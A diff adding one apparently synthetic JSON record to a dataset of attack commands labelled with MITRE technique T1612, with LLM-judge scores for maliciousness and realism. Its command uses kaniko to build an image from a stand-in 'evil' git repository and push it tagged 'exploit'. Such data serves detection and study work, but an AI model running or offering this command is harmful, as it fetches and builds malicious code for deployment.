@@ -1,0 +1,41 @@
+{
+  "technique_id": "T1612",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "kaniko --context git://github.com/evil/repo.git --destination eviluser/malrepo:exploit",
+  "explanation": "This command builds an image using kaniko directly from a Git repository which could contain a malicious Dockerfile and related context, pushing the output to a specified image repository with an exploit tag.",
+  "rationale_steps": [
+    "Fetch code from a remote git repository known to have malicious content.",
+    "Build and tag the image intended for exploit deployment."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1612-aba9f22d-df0b3b55",
+  "source_prompt_hash": "aba9f22d",
+  "timestamp_utc": "2025-07-10T23:23:42.176093Z",
+  "validation": {
+    "syntax_ok": {
+      "pass": true,
+      "forbidden_tokens": true,
+      "obfuscation_suspicious": false,
+      "obfuscation_entropy": 4.37,
+      "command_length": 86
+    },
+    "llm_judgments": [
+      {
+        "model": "gpt-4-turbo",
+        "score": 0.91,
+        "category_fit": 1.0,
+        "attack_realism": 0.9,
+        "maliciousness": 0.85,
+        "technical_plausibility": 0.95,
+        "privilege_relevance": 0.7,
+        "reason": "The sample perfectly fits the category as it involves building a container image directly on a host with potentially malicious content, similar to what is described in technique T1612; the scenario is highly realistic and technically plausible within Linux platforms using bash with basic privileges.",
+        "timestamp": "2025-07-12T18:28:38.896783Z"
+      }
+    ],
+    "llm_average_score": 0.91,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
